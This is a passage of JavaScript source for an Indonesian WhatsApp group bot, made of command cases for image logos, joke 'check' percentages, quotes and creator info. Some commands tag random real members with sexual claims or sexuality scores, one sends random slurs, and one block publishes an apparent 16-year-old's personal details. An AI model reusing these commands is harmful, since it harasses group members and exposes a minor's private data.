if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text1|text2`)
if (!q.includes("|")) return textImg(`Penggunaan ${command} text1|text2`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/textprome2/wolflogo?apikey=${lolkey}&text1=${q.split("|")[0]}&text2=${q.split("|")[1]}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'steel3d':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text1|text2`)
if (!q.includes("|")) return textImg(`Penggunaan ${command} text1|text2`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/textprome2/steel3d?apikey=${lolkey}&text1=${q.split("|")[0]}&text2=${q.split("|")[1]}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'wallgravity':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text1|text2`)
if (!q.includes("|")) return textImg(`Penggunaan ${command} text1|text2`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/textprome2/wallgravity?apikey=${lolkey}&text1=${q.split("|")[0]}&text2=${q.split("|")[1]}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'ganteng':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup)return reply(mess.OnlyGrup)
var kamu = groupMembers
var cinta = groupMembers
var aku = cinta[Math.floor(Math.random() * kamu.length)]
var cintax = kamu[Math.floor(Math.random() * cinta.length)]
let tejs = `Cowok paling ganteng di group ini adalah
*@${aku.jid.split('@')[0]}*`
mentions(tejs, [aku.jid, cintax.jid], true)
break

case 'cantik':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup)return reply(mess.OnlyGrup)
var kamu = groupMembers
var cinta = groupMembers
var aku = cinta[Math.floor(Math.random() * kamu.length)]
var cintax = kamu[Math.floor(Math.random() * cinta.length)]
let gejs = `Cewek️ paling cantik di group ini adalah
*@${cintax.jid.split('@')[0]}*`
mentions(gejs, [aku.jid, cintax.jid], true)
break
case 'sange':
if (!isGroup)return reply(mess.OnlyGrup)
var kamu = groupMembers
var cinta = groupMembers
var aku = cinta[Math.floor(Math.random() * kamu.length)]
var cintax = kamu[Math.floor(Math.random() * cinta.length)]
let tejsqq = `Yang paling sange di group ini adalah\n*@${aku.jid.split('@')[0]}*`
mentions(tejsqq, [aku.jid, cintax.jid], true)
break

case 'sangecek': case 'ceksange':
if (!isGroup)return reply(mess.OnlyGrup)
let sa = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21', '22', '23', '24', '25', '26', '27', '28', '29', '30', '31', '32', '33', '34', '35', '36', '37', '38', '39', '40', '41', '42', '43', '44', '45', '46', '47', '48', '49', '50', '51', '52', '53', '54', '55', '56', '57', '58', '59', '60', '61', '62', '63', '64', '65', '66', '67', '68', '69', '70', '71', '72', '73', '74', '75', '76', '77', '78', '79', '80', '81', '82', '83', '84', '85', '86', '87', '88', '89', '90', '91', '92', '93', '94', '95', '96', '97', '98', '99', '100']
let nge = sa[Math.floor(Math.random() * sa.length)]
let sangean = `Tingkat kesangean kamu *@${sender.split('@')[0]}* adalah ${nge}%`
mentions(`${sangean}`, [sender], true)
break

case 'bebancek': case 'cekbeban':
if (!isGroup)return reply(mess.OnlyGrup)
let beb = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21', '22', '23', '24', '25', '26', '27', '28', '29', '30', '31', '32', '33', '34', '35', '36', '37', '38', '39', '40', '41', '42', '43', '44', '45', '46', '47', '48', '49', '50', '51', '52', '53', '54', '55', '56', '57', '58', '59', '60', '61', '62', '63', '64', '65', '66', '67', '68', '69', '70', '71', '72', '73', '74', '75', '76', '77', '78', '79', '80', '81', '82', '83', '84', '85', '86', '87', '88', '89', '90', '91', '92', '93', '94', '95', '96', '97', '98', '99', '100']
let bann = beb[Math.floor(Math.random() * beb.length)]
let bebann = `Tingkat kebebanan kamu *@${sender.split('@')[0]}* adalah ${bann}%`
mentions(`${bebann}`, [sender], true)
break

case 'lesbicek': case 'ceklesbi':
if (!isGroup)return reply(mess.OnlyGrup)
let les = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21', '22', '23', '24', '25', '26', '27', '28', '29', '30', '31', '32', '33', '34', '35', '36', '37', '38', '39', '40', '41', '42', '43', '44', '45', '46', '47', '48', '49', '50', '51', '52', '53', '54', '55', '56', '57', '58', '59', '60', '61', '62', '63', '64', '65', '66', '67', '68', '69', '70', '71', '72', '73', '74', '75', '76', '77', '78', '79', '80', '81', '82', '83', '84', '85', '86', '87', '88', '89', '90', '91', '92', '93', '94', '95', '96', '97', '98', '99', '100']
let lesbi = les[Math.floor(Math.random() * les.length)]
let lesbii = `Tingkat kelesbi an kamu *@${sender.split('@')[0]}* adalah ${lesbi}%`
mentions(`${lesbii}`, [sender], true)
break

case 'gaycek': case 'cekgay':
if (!isGroup)return reply(mess.OnlyGrup)
let gay = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21', '22', '23', '24', '25', '26', '27', '28', '29', '30', '31', '32', '33', '34', '35', '36', '37', '38', '39', '40', '41', '42', '43', '44', '45', '46', '47', '48', '49', '50', '51', '52', '53', '54', '55', '56', '57', '58', '59', '60', '61', '62', '63', '64', '65', '66', '67', '68', '69', '70', '71', '72', '73', '74', '75', '76', '77', '78', '79', '80', '81', '82', '83', '84', '85', '86', '87', '88', '89', '90', '91', '92', '93', '94', '95', '96', '97', '98', '99', '100']
let gayy = gay[Math.floor(Math.random() * gay.length)]
let gayyy = `Tingkat kegay an kamu *@${sender.split('@')[0]}* adalah ${gayy}%`
mentions(`${gayyy}`, [sender], true)
break

case 'haramcek': case 'cekharam':
if (!isGroup)return reply(mess.OnlyGrup)
let har = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21', '22', '23', '24', '25', '26', '27', '28', '29', '30', '31', '32', '33', '34', '35', '36', '37', '38', '39', '40', '41', '42', '43', '44', '45', '46', '47', '48', '49', '50', '51', '52', '53', '54', '55', '56', '57', '58', '59', '60', '61', '62', '63', '64', '65', '66', '67', '68', '69', '70', '71', '72', '73', '74', '75', '76', '77', '78', '79', '80', '81', '82', '83', '84', '85', '86', '87', '88', '89', '90', '91', '92', '93', '94', '95', '96', '97', '98', '99', '100']
let ram = har[Math.floor(Math.random() * har.length)]
let haramm = `Tingkat keharaman kamu *@${sender.split('@')[0]}* adalah ${ram}%`
mentions(`${haramm}`, [sender], true)
break

case 'pintarcek': case 'pintercek':
if (!isGroup)return reply(mess.OnlyGrup)
let pin = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21', '22', '23', '24', '25', '26', '27', '28', '29', '30', '31', '32', '33', '34', '35', '36', '37', '38', '39', '40', '41', '42', '43', '44', '45', '46', '47', '48', '49', '50', '51', '52', '53', '54', '55', '56', '57', '58', '59', '60', '61', '62', '63', '64', '65', '66', '67', '68', '69', '70', '71', '72', '73', '74', '75', '76', '77', '78', '79', '80', '81', '82', '83', '84', '85', '86', '87', '88', '89', '90', '91', '92', '93', '94', '95', '96', '97', '98', '99', '100']
let ters = pin[Math.floor(Math.random() * pin.length)]
let pinter = `Tingkat kepintaran kamu *@${sender.split('@')[0]}* adalah ${ters}%`
mentions(`${pinter}`, [sender], true)
break

case 'sesatcek': case 'ceksesat':
if (!isGroup)return reply(mess.OnlyGrup)
let ses = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21', '22', '23', '24', '25', '26', '27', '28', '29', '30', '31', '32', '33', '34', '35', '36', '37', '38', '39', '40', '41', '42', '43', '44', '45', '46', '47', '48', '49', '50', '51', '52', '53', '54', '55', '56', '57', '58', '59', '60', '61', '62', '63', '64', '65', '66', '67', '68', '69', '70', '71', '72', '73', '74', '75', '76', '77', '78', '79', '80', '81', '82', '83', '84', '85', '86', '87', '88', '89', '90', '91', '92', '93', '94', '95', '96', '97', '98', '99', '100']
let sat = ses[Math.floor(Math.random() * ses.length)]
let sesatt = `Tingkat kesesatan kamu *@${sender.split('@')[0]}* adalah ${sat}%`
mentions(`${sesatt}`, [sender], true)
break

case 'begocek': case 'cekbego':
if (!isGroup)return reply(mess.OnlyGrup)
let beg = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21', '22', '23', '24', '25', '26', '27', '28', '29', '30', '31', '32', '33', '34', '35', '36', '37', '38', '39', '40', '41', '42', '43', '44', '45', '46', '47', '48', '49', '50', '51', '52', '53', '54', '55', '56', '57', '58', '59', '60', '61', '62', '63', '64', '65', '66', '67', '68', '69', '70', '71', '72', '73', '74', '75', '76', '77', '78', '79', '80', '81', '82', '83', '84', '85', '86', '87', '88', '89', '90', '91', '92', '93', '94', '95', '96', '97', '98', '99', '100']
let gok = beg[Math.floor(Math.random() * beg.length)]
let begok = `Tingkat kebegoan kamu *@${sender.split('@')[0]}* adalah ${gok}%`
mentions(`${begok}`, [sender], true)
break

case 'gantengcek': case 'cekganteng':
if (!isGroup)return reply(mess.OnlyGrup)
let gans = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21', '22', '23', '24', '25', '26', '27', '28', '29', '30', '31', '32', '33', '34', '35', '36', '37', '38', '39', '40', '41', '42', '43', '44', '45', '46', '47', '48', '49', '50', '51', '52', '53', '54', '55', '56', '57', '58', '59', '60', '61', '62', '63', '64', '65', '66', '67', '68', '69', '70', '71', '72', '73', '74', '75', '76', '77', '78', '79', '80', '81', '82', '83', '84', '85', '86', '87', '88', '89', '90', '91', '92', '93', '94', '95', '96', '97', '98', '99', '100']
let teng = gans[Math.floor(Math.random() * gans.length)]
let gamteng = `Tingkat kegantengan kamu *@${sender.split('@')[0]}* adalah ${teng}%`
mentions(`${gamteng}`, [sender], true)
break

case 'cantikcek': case 'cekcantik':
if (!isGroup)return reply(mess.OnlyGrup)
let cans = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21', '22', '23', '24', '25', '26', '27', '28', '29', '30', '31', '32', '33', '34', '35', '36', '37', '38', '39', '40', '41', '42', '43', '44', '45', '46', '47', '48', '49', '50', '51', '52', '53', '54', '55', '56', '57', '58', '59', '60', '61', '62', '63', '64', '65', '66', '67', '68', '69', '70', '71', '72', '73', '74', '75', '76', '77', '78', '79', '80', '81', '82', '83', '84', '85', '86', '87', '88', '89', '90', '91', '92', '93', '94', '95', '96', '97', '98', '99', '100']
let tik = cans[Math.floor(Math.random() * cans.length)]
let camtik = `Tingkat kecantikan kamu *@${sender.split('@')[0]}* adalah ${tik}%`
mentions(`${camtik}`, [sender], true)
break

case 'jadian':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup)return reply(mess.OnlyGrup)
var kamu = groupMembers
var cinta = groupMembers
var aku = cinta[Math.floor(Math.random() * kamu.length)]
var cintax = kamu[Math.floor(Math.random() * cinta.length)]
let vejs = `Ciee.. yang lagi jadian
*@${aku.jid.split('@')[0]}* ️❤️ @${cintax.jid.split('@')[0]}
Semoga Langgeng Yaa~`
mentions(vejs, [aku.jid, cintax.jid], true)
break

case 'ngewe':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup)return reply(mess.OnlyGrup)
var you = groupMembers
var ngewe = groupMembers
var iam = ngewe[Math.floor(Math.random() * you.length)]
var ngentot = you[Math.floor(Math.random() * ngewe.length)]
let suryaaa = `Yang ngewe kemarin digrup ini adalah
*@${iam.jid.split('@')[0]}* dan️ @${ngentot.jid.split('@')[0]}
Mereka ngewe sampai 5x anjir😳`
mentions(suryaaa, [iam.jid, ngentot.jid], true)
break

case 'gaycek': case 'seberapagay': 
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
axios.get(`https://arugaz.herokuapp.com/api/howgay`).then(res => res.data).then(res =>
mentions(`Nih lihat data Gay si @${sender.split('@')[0]}

Persentase Gay : ${res.persen}%
Alert! : ${res.desc}`, [sender], true))
break
case 'listhero': case 'hml':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
mentions(`${Ucapan} @${sender.split('@')[0]}
${sholat}

╭━━❬ *WAKTU* ❬━━━━━━❭
│ _*• ${wib}*_
│ _*• ${wit}*_
│ _*• ${wita}*_
│ _*• Tanggal : ${tampilBulan}*_
│ _*• Tanggal Islam : ${dateIslamic}*_
└─────────────────

╭━━❬ LIST HERO ML ❭
│➪ ${S}Akai
│➪ Aldous
│➪ Alice
│➪ Alucard
│➪ Angela
│➪ Argus
│➪ Atlas
│➪ Aurora
│➪ Badang
│➪ Balmond
│➪ Bane
│➪ Barats
│➪ Baxia
│➪ Beatrix
│➪ Belerick
│➪ Benedetta
│➪ Brody
│➪ Bruno
│➪ Carmilla
│➪ Cecilion
│➪ Change
│➪ Chou
│➪ Claude
│➪ Clint
│➪ Cyclops
│➪ Diggie
│➪ Dyrroth
│➪ Esmeralda
│➪ Estes
│➪ Eudora
│➪ Fanny
│➪ Faramis
│➪ Franco
│➪ Freya
│➪ Gatotkaca
│➪ Gloo
│➪ Gord
│➪ Granger
│➪ Grock
│➪ Guinevere
│➪ Gusion
│➪ Hanabi
│➪ Hanzo
│➪ Harith
│➪ Harley
│➪ Hayabusa
│➪ Helcurt
│➪ Hilda
│➪ Hylos
│➪ Irithel
│➪ Jawhead
│➪ Johnson
│➪ Kadita
│➪ Kagura
│➪ Kaja
│➪ Karina
│➪ Karrie
│➪ Khaleed
│➪ Khufra
│➪ Kimmy
│➪ Lancelot
│➪ Lapu Lapu
│➪ Layla
│➪ Leomord
│➪ Lesley
│➪ Ling
│➪ Lolita
│➪ Lunox
│➪ Luo Yi
│➪ Lylia
│➪ Martis
│➪ Masha
│➪ Mathilda
│➪ Minotaur
│➪ Minsitthar
│➪ Miya
│➪ Moskov
│➪ Nana
│➪ Natalia
│➪ Odette
│➪ Paquito
│➪ Pharsa
│➪ Phoveus
│➪ Popol And Kupa
│➪ Rafaela
│➪ Roger
│➪ Ruby
│➪ Saber
│➪ Selena
│➪ Silvanna
│➪ Sun
│➪ Terizla
│➪ Thamuz
│➪ Tigreal
│➪ Uranus
│➪ Vale
│➪ Valir
│➪ Vexana
│➪ Wan Wan
│➪ X Borg
│➪ Yi Sun Shin
│➪ Yu Zhong
│➪ Yve
│➪ Zhask
│➪ Zilong
│➪ Natan
└─────────────────️`, [sender], true)
break

/*case 'ic': case 'infocreator': case 'infosurya':
if (isMuted) retur
if (isBan) return 
let infocreator = `
${Ucapan} @${sender.split('@')[0]}
Dibawah ini adalah data diri creator saya

─────────────────────
*⬡ Name : Jabal Surya Ngalam*
*⬡ Age : 16 Tahun*
*⬡ Class : 11 SMK*
*⬡ Home town : Jepara, Jateng*
*⬡ Religion : Islam*
*⬡ Date of birth : 21 Mei 2005*
*⬡ Gender : Cowok*
*⬡ Status : Jomblo happy:v*
*⬡ WhatsApp : @${Suryaa.split('@')[0]}*
*⬡ Girlfriend  : Ga ada*
*⬡ Quotes : Love me and i will Love you back*
*⬡ Favorite movie : Boboiboy the movie*
*⬡ Favorite food : Pizza & mie ayam*
*⬡ Favorite drink : Susu kedelai*
*⬡ Height : 169 Cm*
*⬡ Weight : 46 Kg*
*⬡ Hobby : Berenang*
*⬡ Instagram : https://www.instagram.com/surya_skylark05*
─────────────────────`
surya.sendMessage(from, infocreator, text, {thumbnail: fs.readFileSync('./media/Surya.jpg'), "contextInfo": {mentionedJid: [Suryaa, sender]}, quoted: ftroli})
break*/

case 'ic': case 'infocreator': case 'infosurya':
if (isMuted) retur
if (isBan) return
let Fotosurya = await getBuffer(`https://i.ibb.co/ZH59Rx2/d61d5e369e49.jpg`)
let Ryaa = await surya.prepareMessage(from, Fotosurya, location, {thumbnail: Fotosurya})
const Suryabutton = [{buttonId: 'verify', buttonText: {displayText: 'Ok stah surya🐱'}, type: 1}]
const suryaMessage = {
locationMessage: Ryaa.message.locationMessage,
contentText: `${Ucapan} @${sender.split('@')[0]}
Dibawah ini adalah data diri creator saya

─────────────────────
*⬡ Name : Jabal Surya Ngalam*
*⬡ Age : 16 Tahun*
*⬡ Class : 11 SMK*
*⬡ Home town : Jepara, Jateng*
*⬡ Religion : Islam*
*⬡ Date of birth : 21 Mei 2005*
*⬡ Gender : Cowok*
*⬡ Status : Jomblo happy:v*
*⬡ WhatsApp : @${Suryaa.split('@')[0]}*
*⬡ Girlfriend  : Ga ada*
*⬡ Quotes : Love me and i will Love you back*
*⬡ Favorite movie : Boboiboy the movie*
*⬡ Favorite food : Pizza & mie ayam*
*⬡ Favorite drink : Susu kedelai*
*⬡ Height : 169 Cm*
*⬡ Weight : 46 Kg*
*⬡ Hobby : Berenang*
*⬡ Instagram : https://www.instagram.com/surya_skylark05*
─────────────────────`,
buttons: Suryabutton,
headerType: 6
}

surya.sendMessage(from, suryaMessage, MessageType.buttonsMessage, {contextInfo: { forwardingScore: 100000, isForwarded: true, mentionedJid: [Suryaa, sender]}, quoted : msg})
limitAdd(sender, limit)
break

case 'note':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
mentions(`${Ucapan} @${sender.split('@')[0]}
${sholat}

╭━━❬ *WAKTU* ❬━━━━━━❭
│ _*• ${wib}*_
│ _*• ${wit}*_
│ _*• ${wita}*_
│ _*• Tanggal : ${tampilBulan}*_
│ _*• Tanggal Islam : ${dateIslamic}*_
└─────────────────

╭━━❬ NOTE ❭
│${owner} : Fitur Admin Grup atau Owner
│${free} : Fitur gratis yang tidak memakai limit
│${revatod} : Fitur yang memakai 1 limit harian
│${kizora} : Fitur yang memakai 1 limit game
│${prem} : Fitur khusus premium user
└────────────────`, [sender], true)
break
case 'listdonasi':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
let donasi = `${Ucapan} @${sender.split('@')[0]}

╭━━❬ *WAKTU* ❬━━━━━━❭
│ _*• ${wib}*_
│ _*• ${wit}*_
│ _*• ${wita}*_
│ _*• Tanggal : ${tampilBulan}*_
│ _*• Tanggal Islam : ${dateIslamic}*_
└─────────────────

╭━━❬ LIST DONASI ❭
│➪ @${Kizora.split('@')[0]} -> 58000
│➪ @${Dinda.split('@')[0]} -> 5000
└────────────────`
surya.sendMessage(from, donasi, text, {contextInfo: { forwardingScore: 10000, isForwarded: true, mentionedJid: [sender, Dinda, Kizora]},quoted: fkontak, caption: donasi})

break
case 'grupcreator': case 'gcowner': case 'gcs': case 'ownergroup':
//if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isBan) return 
let mechagc = `${Mechagc}

Jangan lupa join ya~`
surya.sendMessage(from, mechagc, text, {contextInfo: { forwardingScore: 100000, isForwarded: true, mentionedJid: [sender]},quoted: fgc, caption: mechagc})
break
case 'bot':
if (isMuted) return
if (isBan) return 
if (isOwner2) return
reply(`Iya ada apa ${pushname}, ada yang bisa saya bantu?`)
break
case 'bisakah':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
const bisa = ['Tentu Saja Bisa! Kamu Adalah Orang Paling Homky', 'Gak Bisa Ajg Aowkwowk', 'Hmm Gua Gak Tau Yaa, tanya ama bapakau', 'Ulangi Tod Gua Ga Paham', 'Coba tanya mantan lu', 'Gatau gw njir, tanya doi lu aja']
const keh = bisa[Math.floor(Math.random() * bisa.length)]
reply(`Pertanyaan : ${args[0]} ${q} Jawaban : ${keh}`)
break
case 'kapankah':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
const kapan = ['Besok', 'Lusa', 'Tadi', '4 Hari Lagi', '5 Hari Lagi', '6 Hari Lagi', '1 Minggu Lagi', '2 Minggu Lagi', '3 Minggu Lagi', '1 Bulan Lagi', '2 Bulan Lagi', '3 Bulan Lagi', '4 Bulan Lagi', '5 Bulan Lagi', '6 Bulan Lagi', '7 Bulan Lagi', '1 Tahun Lagi', '2 Tahun Lagi', '3 Tahun Lagi', '4 Tahun Lagi', '5 Tahun Lagi', '6 Tahun Lagi', '1 Abad lagi', '3 Hari Lagi']
const koh = kapan[Math.floor(Math.random() * kapan.length)]
reply(`Pertanyaan : ${args[0]} ${q}\nJawaban : ${koh}`)
break

case 'apakah':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
const apa = ['Iya', 'Tidak', 'Bisa jadi', 'mungkin saja', 'entahlah']
const kah = apa[Math.floor(Math.random() * apa.length)]
surya.sendMessage(from, `Pertanyaan : ${args[0]} ${q}\nJawaban : ${kah}`, text, {thumbnail: suryaImg, sendEphemeral: true, quoted:msg, contextInfo : {mentionedJid: [Suryaa, sender], forwardingScore: 508, isForwarded: true}})
//reply(`Pertanyaan : ${args[0]} @${sender.split('@')[0]} ${q}\nJawaban : ${kah}`)
break
case 'toxic':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let kata = [
'babi',
'monyet',
'anjing',
'jembut',
'pantek',
'memek',
'kontol',
'tempik',
'bencong',
'jancok',
'gay',
'lesbi',
'tai',
'setan',
'begok',
'cangcut',
'bangsat',
'ngentot',
'tolol'
]
let randKata = kata[Math.floor(Math.random() * kata.length)]
let list = [
`Muka lo kek ${randKata}`, `Anda tau ${randKata} ?`,`${randKata} Lo ${randKata}`,
`Ngapa ${randKata} ga seneng?`,`Ribut sini lo ${randKata}`,`Jangan ngakak lo ${randKata}`,
`Woy ${randKata}!!`,`Aku sih owh aja ya ${randKata}`,`Ga seneng sharelock lo ${randKata}`,
`Capek gw ${randKata}`, `Hari ini kau minat gelut ${randKata} ?`, `Gw tau lo itu ${randKata}`,
`Gw ganteng dan lo kek ${randKata}`,`Bucin lo ${randKata}`,
`Najis baperan kek ${randKata}`,`Gw cantik dan lo kek ${randKata}`,
`Nge-teh ${randKata}`,`Gaya lo sok iye, mukalo kek ${randKata}`,`${randKata} Awokwowkok`
]
 const tox = list[Math.floor(Math.random() * list.length)]
//surya.sendMessage(from, tox, text, { quoted: msg })
const buttonstox = [{buttonId: 'toxic', buttonText: {displayText: 'Toxic'}, type: 1}]
const toxicMessage = {
contentText: tox,
buttons: buttonstox,
headerType: 1
}

surya.sendMessage(from, toxicMessage, MessageType.buttonsMessage, {contextInfo: { forwardingScore: 100000, isForwarded: true, mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted : msg})
limitAdd(sender, limit)
break

case 'bucin':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let databucin = fs.readFileSync('./database/data/bucin.js')
let bucin1 = JSON.parse(databucin)
let bucin2 = Math.floor(Math.random() * bucin1.length);
let bucin3 = bucin1[bucin2]
//surya.sendMessage(from, cin, text, { quoted: msg })
const buttonsbu = [{buttonId: 'bucin', buttonText: {displayText: 'NEXT ➡️'}, type: 1}]
const buttonscinMessage = {
contentText: `${bucin3.result.bucin}`,
footerText: `Love me and i will Love you back❤️\nBy @${Suryaa.split('@')[0]}`,
buttons: buttonsbu,
headerType: 1
}
surya.sendMessage(from, buttonscinMessage, MessageType.buttonsMessage, {
contextInfo: {mentionedJid: [Suryaa, '0@s.whatsapp.net']}, quoted: msg})
limitAdd(sender, limit)
break
case 'pantun':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let datapantun = fs.readFileSync('./database/data/pantun.js')
let pantun1 = JSON.parse(datapantun)
let pantun2 = Math.floor(Math.random() * pantun1.length);
let pantun3 = pantun1[pantun2]
surya.sendMessage(from, `${pantun3.result.pantun}`, text, { quoted: msg })
limitAdd(sender, limit)
break
case 'quotes':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let dataquotes = fs.readFileSync('./database/data/quotes.js')
let quotes1 = JSON.parse(dataquotes)
let quotes2 = Math.floor(Math.random() * quotes1.length);
let quotes3 = quotes1[quotes2]
const buttonsquo = [{buttonId: 'quotes', buttonText: {displayText: 'NEXT ➡️'}, type: 1}]
const buttonstesMessage = {
contentText: `${quotes3.result.quotes}`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttonsquo,
headerType: 1
}

surya.sendMessage(from, buttonstesMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, '0@s.whatsapp.net']}, quoted: msg})
limitAdd(sender, limit)
break

case 'rate':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
const ra = ['4', '9', '17', '28', '34', '48', '59', '62', '74', '83', '97', '100', '29', '94', '75', '82', '41', '39']
const te = ra[Math.floor(Math.random() * ra.length)]
surya.sendMessage(from, 'Pertanyaan : ' + q + `

Jawaban : ` + te + '%', text, { quoted: msg })
break

case 'hobby':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
const hob = ['Desah Di Game', 'Ngocokin Doi', 'Stalking sosmed nya mantan', 'Kau kan gak punya hobby awokawok', 'Memasak', 'Membantu Atok', 'Mabar', 'Nobar', 'Sosmedtan', 'Membantu Orang lain', 'Nonton Anime', 'Nonton Drakor', 'Naik Motor', 'Nyanyi', 'Menari', 'Bertumbuk', 'Menggambar', 'Foto fotoan Ga jelas', 'Maen Game', 'Berbicara Sendiri']
const by = hob[Math.floor(Math.random() * hob.length)]
surya.sendMessage(from, 'Pertanyaan : ' + q + `

Jawaban : ` + by, text, { quoted: msg })
break

case 'truth':
